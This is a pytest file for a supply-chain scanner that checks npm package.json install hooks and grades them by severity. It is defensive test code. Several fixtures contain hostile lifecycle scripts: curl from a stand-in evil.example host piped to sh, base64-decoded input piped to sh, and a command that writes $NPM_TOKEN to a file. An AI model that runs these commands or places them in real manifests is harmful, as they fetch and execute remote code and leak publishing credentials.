"""Tests for ``packages.sca.supply_chain.install_hooks``."""

from __future__ import annotations

import json
from pathlib import Path

from packages.sca.models import Confidence, Dependency, Manifest, PinStyle
from packages.sca.supply_chain.install_hooks import scan_manifests


def _write(tmp_path: Path, payload: dict) -> Manifest:
    p = tmp_path / "package.json"
    p.write_text(json.dumps(payload), encoding="utf-8")
    return Manifest(path=p, ecosystem="npm", is_lockfile=False)


def _dep(path: Path) -> Dependency:
    return Dependency(
        ecosystem="npm", name="pkg",
        version="1.0.0", declared_in=path,
        scope="main", is_lockfile=False,
        pin_style=PinStyle.EXACT, direct=True,
        purl="pkg:npm/pkg@1.0.0",
        parser_confidence=Confidence("high", reason="t"),
    )


def test_no_scripts_means_no_findings(tmp_path: Path) -> None:
    m = _write(tmp_path, {"name": "x"})
    assert scan_manifests([m], [_dep(m.path)]) == []


def test_benign_postinstall_emits_low_severity_row(tmp_path: Path) -> None:
    m = _write(tmp_path, {"scripts": {"postinstall": "node ./build.js"}})
    findings = scan_manifests([m], [_dep(m.path)])
    assert len(findings) == 1
    f = findings[0]
    assert f.hit.script_key == "postinstall"
    assert f.severity == "low"
    assert f.hit.reasons == []


def test_curl_pipe_shell_flagged_as_high(tmp_path: Path) -> None:
    m = _write(tmp_path, {"scripts": {
        "postinstall": "curl https://evil.example/x.sh | sh"}})
    findings = scan_manifests([m], [_dep(m.path)])
    assert findings[0].severity == "high"
    assert any("curl piped to shell" in r for r in findings[0].hit.reasons)


def test_base64_decode_flagged(tmp_path: Path) -> None:
    m = _write(tmp_path, {"scripts": {
        "preinstall": "echo " + "A" * 50 + " | base64 -d | sh"}})
    findings = scan_manifests([m], [_dep(m.path)])
    assert findings[0].severity == "high"


def test_npm_token_reference_flagged(tmp_path: Path) -> None:
    m = _write(tmp_path, {"scripts": {
        "postinstall": "echo $NPM_TOKEN > /tmp/x"}})
    findings = scan_manifests([m], [_dep(m.path)])
    assert findings[0].severity == "high"
    assert any("NPM_TOKEN" in r for r in findings[0].hit.reasons)


def test_multiple_lifecycle_keys_each_emit(tmp_path: Path) -> None:
    m = _write(tmp_path, {"scripts": {
        "preinstall": "echo hi",
        "postinstall": "node build.js",
        "prepublish": "echo bye",
    }})
    findings = scan_manifests([m], [_dep(m.path)])
    keys = {f.hit.script_key for f in findings}
    assert keys == {"preinstall", "postinstall", "prepublish"}


def test_lockfile_skipped(tmp_path: Path) -> None:
    p = tmp_path / "package-lock.json"
    p.write_text("{}")
    m = Manifest(path=p, ecosystem="npm", is_lockfile=True)
    assert scan_manifests([m], []) == []


def test_invalid_json_skipped(tmp_path: Path) -> None:
    p = tmp_path / "package.json"
    p.write_text("{ broken")
    m = Manifest(path=p, ecosystem="npm", is_lockfile=False)
    assert scan_manifests([m], []) == []


def test_placeholder_dep_when_no_dep_present(tmp_path: Path) -> None:
    """If no real dep was parsed for the manifest, a placeholder hosts
    the finding."""
    m = _write(tmp_path, {"scripts": {"postinstall": "node b.js"}})
    findings = scan_manifests([m], [])
    assert len(findings) == 1
    assert findings[0].dependency.name == "<package.json>"
